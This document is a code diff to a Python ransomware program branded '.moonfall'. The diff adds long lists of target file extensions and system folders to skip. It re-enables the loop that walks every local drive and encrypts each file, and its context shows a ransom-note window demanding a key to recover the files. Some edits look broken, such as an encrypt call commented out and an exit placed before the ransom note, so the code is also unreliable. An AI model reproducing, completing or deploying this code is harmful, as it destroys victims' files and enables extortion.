@@ -16,9 +16,31 @@ import win32api
 import subprocess
 import ctypes
 
-
 brand_name = '.moonfall'
-protected_folders = ['PerfLogs', 'Windows', 'ransomware']
+
+"""Please for further information check https://pastebin.com/xZKU7Ph1"""
+
+protected_folders = ['Content.IE5', 'Temporary Internet Files', '\AppData\Local\Temp', '\Program Files (x86)', '\Program Files', '\WINDOWS', '\ProgramData', '\Intel', '$\\', '\Local Settings\Temp', 'Windows', 'ransomware']
+
+to_avoid_extensions = ['.moonfall', '.dll', '.exe']
+
+target_extensions = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst','.ost', '.msg', 
+  '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf', 
+  '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg']
+
+target_extensions_2 = ['.docb', '.docm', '.dot','.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', 
+  '.xltx', '.xltm', '.pptm', '.pot', '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', 
+  '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm', '.sldm', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', 
+  '.ARC', '.PAQ', '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz', '.7z', '.rar', '.zip', '.backup', 
+  '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif','.tiff', '.nef', '.psd', '.ai', 
+  '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', 
+  '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3', '.sh', '.class', 
+  '.jar', '.java', '.rb', '.asp', '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb','.vbs', 
+  '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp', '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', 
+  '.ibd', '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb', 
+  '.sqlite3', '.asc', '.lay6', '.lay', '.mml', '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd', 
+  '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', 
+  '.uot', '.stw', '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der']
 
 
 """
@@ -80,7 +102,6 @@ def save_data(filename, data, opt='add_ext'):
         oschmod.set_mode(filename, "a+rwx,g-w,o-x") #TODO repasar permisos
     with open(filename, 'wb') as file:
         file.write(data)
-    file.close()
 
     if opt == 'add_ext':
         os.rename(filename, filename + brand_name)
@@ -108,7 +129,7 @@ def encrypt_or_decrypt(filename, key, opt='encrypt'):
         f = Fernet(key)
         data = load_data(filename)
         if opt == 'encrypt':
-            encrypted_data = f.encrypt(data)
+            # encrypted_data = f.encrypt(data)
             save_data(filename, encrypted_data)
         elif opt == 'decrypt':
             decrypted_data = f.decrypt(data)
@@ -143,14 +164,13 @@ if __name__ == '__main__':
     """
     
     # Iterative algorithm TODO Inefficient
-    for d in local_drives:
-        for root, dirs, files in os.walk(d):
-            if dirs in protected_folders:
-                continue
+    for ld in local_drives:
+        for root, dirs, files in os.walk(ld):
+            [dirs.remove(d) for d in list(dirs) if d in protected_folders]
             for fn in files:
                 full_path = root + os.sep + fn
-                # encrypt_or_decrypt(full_path, key)
-
+                encrypt_or_decrypt(full_path, key)
+    sys.exit()
     # Show Ransom note
     sg.theme('DarkRed2')
     layout = [	[sg.Text('Attention your files have been encrypted under a strong\n encryption algorithm called AES-256', font='Helvetica 18')],
@@ -168,7 +188,7 @@ if __name__ == '__main__':
                [sg.Text(
                    'Introduce the key that we have sent to you, to recover your files here', font='Helvetica 13')],
                [sg.InputText()],
-               [sg.Text('')],
+                              [sg.Text('')],
                [sg.Button('Decrypt files')]]
 
     window = sg.Window('Title', layout, no_titlebar=True,
@@ -182,10 +202,9 @@ if __name__ == '__main__':
             key = values[0]
 
             # TODO Inefficient
-            for d in local_drives:
-                for root, dirs, files in os.walk(root):
-                    if dirs in protected_folders:
-                        continue
+            for ld in local_drives:
+                for root, dirs, files in os.walk(ld):
+                    [dirs.remove(d) for d in list(dirs) if d in protected_folders]
                     for fn in files:
                         full_path = root + os.sep + fn
                         try:
